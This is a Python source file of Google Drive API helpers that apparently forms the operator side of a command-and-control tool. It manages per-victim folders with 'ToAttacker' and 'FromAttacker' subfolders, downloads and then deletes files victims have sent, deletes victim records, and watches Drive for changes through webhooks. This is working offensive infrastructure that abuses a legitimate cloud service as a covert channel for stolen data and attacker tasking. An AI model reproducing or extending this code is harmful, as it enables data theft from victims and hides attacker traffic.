from config import *

from io import BytesIO
### Google Auth imports
from google.oauth2 import service_account
from googleapiclient.discovery import build
from apiclient.http import MediaFileUpload, MediaIoBaseUpload, MediaIoBaseDownload
from apiclient import errors
import uuid
import io
import os
from logger import logger


def authorize():
    return service_account.Credentials.from_service_account_file(
        SERVICE_ACCOUNT_FILE, scopes = SCOPES)


def retrieve_changes(drive_service, token):
    change_list = []
    if drive_service == None:
        return
    page_token = token
    while page_token is not None:
        response = drive_service.changes().list(pageToken=page_token, spaces='drive').execute()

        for change in response.get('changes'):
            change_list.append(change)
        if 'newStartPageToken' in response:
            # Last page, save this token for the next polling interval
            token = response.get('newStartPageToken')
        page_token = response.get('nextPageToken')
    return token, change_list


def delete_victim(drive_service, victim):
    if delete_file(drive_service, get_victim_folder_id_from_name(drive_service, victim)):
        logger().info("Victim {} deleted.".format(victim))
    else:
        logger().error("Failed to delete victim {}!".format(victim))


def download_victim_files(drive_service, folder_name):
    try:
        download_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "downloads", folder_name)
        if not os.path.exists(os.path.join(os.path.dirname(os.path.realpath(__file__)), "downloads")):
            os.mkdir(os.path.join(os.path.dirname(os.path.realpath(__file__)), "downloads"))
        if not os.path.exists(download_path):
            os.mkdir(download_path)
        toAttacker_id = get_to_attacker_folder_id(drive_service, folder_name)
        if toAttacker_id is None:
            return
        children = drive_service.files().list(q="'" + toAttacker_id + "' in parents and mimeType != 'application/vnd.google-apps.folder'",
                                            spaces='drive',
                                            fields='nextPageToken, files(id, name)').execute()

        for child in children['files']:
            request = drive_service.files().get_media(fileId=child['id'])
            fh = io.FileIO(os.path.join(download_path, os.path.split(child['name'])[1]), 'wb', closefd=True)
            downloader = MediaIoBaseDownload(fh, request)
            done = False
            while done is False:
                done = downloader.next_chunk()

            delete_file(drive_service, child['id'])
    except errors.HttpError as error:
        logger().error('An error occurred: %s' % error)
        return None

def create_new_folder(drive_service, folder_name, parent_id = ROOT_FOLDER):
    try:
        file_metadata = {
            'name': folder_name,
            'mimeType': 'application/vnd.google-apps.folder',
            'parents': [ parent_id ]
        }
        file = drive_service.files().create(body=file_metadata, fields='id').execute()

        logger().debug('Created new Folder: %s' % file.get('id'))
        return file.get('id')
    except errors.HttpError as error:
        logger().error('An error occurred: %s' % error)
        return None


def upload_file(drive_service, path,  filename = None,  parent_id = ROOT_FOLDER, mimeType='application/json'):
    try:
        if filename == None:
            filename = path.split("/")[-1]

        logger().debug("Uploading %s, into %s" %(filename, parent_id))

        file_metadata = {
            'name': filename,
            'mimeType': mimeType,
            'parents': [ parent_id ]
            }
        media = MediaFileUpload(path)
        file = drive_service.files().create(body=file_metadata,
                                            media_body=media,
                                            fields='id').execute()
        logger().debug('File uploaded: %s' % file.get('id'))
        return file.get('id')
    except errors.HttpError as error:
        logger().error('Failed to upload: %s' % error)
        return None


def upload_send_file(service, file_path, file_name, folder_id):
    file_metadata = {
        'name': file_name,
        'parents': [folder_id]
    }

    response = MediaFileUpload(file_path, chunksize=1024 * 1024, resumable=True)

    file = service.files().create(body=file_metadata,
                                  media_body=response,
                                  fields='id').execute()


def upload_file_memory(drive_service, filename, data = "",  parent_id = ROOT_FOLDER, mimeType='application/json'):
    try:
        fh = BytesIO(data.encode())
        media = MediaIoBaseUpload(fh, mimetype=mimeType,
        chunksize=1024*1024, resumable=True)
        file_metadata = {
            'name': filename,
            'mimeType': mimeType,
            'parents': [ parent_id ]
        }
        created_file = drive_service.files().create(body=file_metadata,
                                            media_body=media,
                                            fields='id').execute()
        return created_file
    except errors.HttpError as error:
        logger().error('An error occurred: %s' % error)
        return None


def delete_file(drive_service, file_id):
    if file_id is None:
        return False
    try:
        drive_service.files().delete(fileId = file_id).execute();
        return True
    except errors.HttpError as error:
        logger().error('An error occurred: %s' % error)
        return False


def get_victim_folder_id_from_name(service, victim):
    page_token = None
    results = service.files().list(q="mimeType = 'application/vnd.google-apps.folder'",
                                          spaces='drive',
                                          fields='nextPageToken, files(id, name)',
                                          pageToken=page_token).execute()

    victim_folder_id = None

    for item in results.get('files', []):
        if item['name'] == victim:
            victim_folder_id = item['id']

    return victim_folder_id


def rename_file(drive_service, file_id, new_name, new_revision = False):
    try:
        file = {'name': new_name}

        # Rename the file.
        updated_file = drive_service.files().update(
            fileId=file_id,
            body=file,
            fields='name').execute()

        logger().debug("Renamed file in drive to %s "% new_name)

        return updated_file
    except errors.HttpError as error:
        logger().error('An error occurred: %s' % error)
        return None



def get_service():
    creds = authorize()
    return build('drive', 'v3', credentials=creds)


def get_from_attacker_folder_id(service, folder_name):
    page_token = None
    results = service.files().list(q="mimeType = 'application/vnd.google-apps.folder'",
                                          spaces='drive',
                                          fields='nextPageToken, files(id, name)',
                                          pageToken=page_token).execute()

    victim_folder_id = None

    for item in results.get('files', []):
        if item['name'] == folder_name:
            victim_folder_id = item['id']

    children = service.files().list(q="'" + victim_folder_id + "' in parents",
                                    spaces='drive',
                                    fields='nextPageToken, files(id, name)').execute()

    for child in children.get('files', []):
        if(child['name'] == "FromAttacker"):
            return child['id']


def get_to_attacker_folder_id(service, folder_name):
    page_token = None
    results = service.files().list(q="mimeType = 'application/vnd.google-apps.folder'",
                                          spaces='drive',
                                          fields='nextPageToken, files(id, name)',
                                          pageToken=page_token).execute()

    victim_folder_id = None

    for item in results.get('files', []):
        if item['name'] == folder_name:
            victim_folder_id = item['id']

    children = service.files().list(q="'" + victim_folder_id + "' in parents",
                                    spaces='drive',
                                    fields='nextPageToken, files(id, name)').execute()

    for child in children.get('files', []):
        if(child['name'] == "ToAttacker"):
            return child['id']


def start_watching(drive_service, url, root_folder_id):
    """
    :param url: the url to post notifications to
    :return: created notification channel id
    """
    channelID = str(uuid.uuid4())
    
    body = {
        'id': channelID,
        'type': "web_hook",
        'address': url
    }
    page_token = drive_service.changes().getStartPageToken().execute()
    try:
        resourceID = drive_service.changes().watch(pageToken=page_token.get('startPageToken'),body=body).execute()#fileId=root_folder_id, body=body).execute()
        return (channelID, resourceID, page_token.get('startPageToken'))
    except Exception:
        logger().error("An error occurred in start watching")


def stop_watching(drive_service, channel_id, resource_id, root_folder_id):
    body = {
        'id': channel_id,
        'resourceId': resource_id['resourceId']
    }
    try:
        return drive_service.channels().stop(body=body).execute()
    except Exception:
        logger().error("An error occurred in stop watching")